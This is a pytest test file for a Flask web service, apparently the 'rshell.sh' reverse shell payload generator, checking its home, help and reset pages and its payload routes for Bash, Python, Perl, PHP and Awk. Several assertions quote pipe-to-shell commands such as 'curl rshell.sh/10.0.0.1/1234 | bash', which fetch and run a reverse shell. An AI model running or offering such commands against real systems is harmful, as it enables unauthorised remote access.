import pytest

# Test home page html.
def test_home(app, client):
	# GET Request tests.
	response = client.get('/')
	assert response.status_code == 200	# Return's 200 to GET requests.
	assert b"rshell.sh" in response.data
	assert b"Reverse Shell Payload Microservice" in response.data
	assert b"Examples" in response.data
	assert b"* Basic Usage:" in response.data
	assert b"curl rshell.sh/10.0.0.1/1234 | bash" in response.data
	assert b"* Different Languages:" in response.data
	assert b"curl rshell.sh/10.0.0.1/1234/?lang=python | python" in response.data
	assert b"* Quote Wrapped:" in response.data
	assert b"curl rshell.sh/10.0.0.1/1234?quotes=single | xargs bash -c" in response.data
	assert b"Web & Term Friendly Help Page" in response.data
	assert b"curl rshell.sh/help" in response.data
	assert b"* JSON API:" in response.data
	assert b"Plz No Use 4 Bad Hax!!!" in response.data

	# POST Request tests.
	response = client.post('/', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.


# Test help page html.
def test_help(app, client):
	# GET Request tests.
	response = client.get('/help')
	assert response.status_code == 200	# Return's 200 to GET requests.
	assert b"rshell.sh - Help Page" in response.data
	assert b"Reverse Shell Payload Microservice" in response.data
	assert b"Supported Languages" in response.data
	assert b"Bash" in response.data
	assert b"Python3" in response.data
	assert b"Perl" in response.data
	assert b"PHP" in response.data
	assert b"Awk" in response.data
	assert b"GET Parameters" in response.data
	assert b"q" in response.data
	assert b"y" in response.data
	assert b"API Options" in response.data
	assert b"host" in response.data
	assert b"port" in response.data
	assert b"lang" in response.data
	assert b"Extras" in response.data
	assert b"Python Shell Reset" in response.data
	assert b"curl -s rshell.sh/reset" in response.data
	assert b"Command Line Friendly Help Menu" in response.data
	assert b"curl -s rshell.sh/help" in response.data
	assert b"No Use 4 Bad Hax!!!" in response.data
	assert b"Main Page" in response.data

	# POST Request tests.
	response = client.post('/', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.


# Test stabilize / reset page html.
def test_stabilize(app, client):
	# GET Request tests.
	response = client.get('/stabilize')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/reset')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/reset', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.


# Testing bash.
def test_bash(app, client):
	# GET Request tests.
	response = client.get('/127.0.0.1/12345/?lang=bash')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345?lang=bash')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345')
	assert response.status_code == 200	# Return's 200 to GET requests.

	# POST Request tests.
	response = client.post('/127.0.0.1/12345/?lang=bash', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.

	response = client.post('/127.0.0.1/12345?lang=bash', data=dict(test=''))
	assert response.status_code == 405	# Return's 405 to POST requests.


# Testing python.
def test_python(app, client):
	# GET Request tests.
	response = client.get('/127.0.0.1/12345/?lang=python3')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345?lang=python')
	assert response.status_code == 200	# Return's 200 to GET requests.


# Testing perl.
def test_perl(app, client):
	# GET Request tests.
	response = client.get('/127.0.0.1/12345/?lang=perl')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345?lang=perl')
	assert response.status_code == 200	# Return's 200 to GET requests.

# Testing php.
def test_php(app, client):
	# GET Request tests.
	response = client.get('/127.0.0.1/12345/?lang=php')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345?lang=php')
	assert response.status_code == 200	# Return's 200 to GET requests.

# Testing awk.
def test_awk(app, client):
	# GET Request tests.
	response = client.get('/127.0.0.1/12345/?lang=awk')
	assert response.status_code == 200	# Return's 200 to GET requests.

	response = client.get('/127.0.0.1/12345?lang=awk')
	assert response.status_code == 200	# Return's 200 to GET requests.
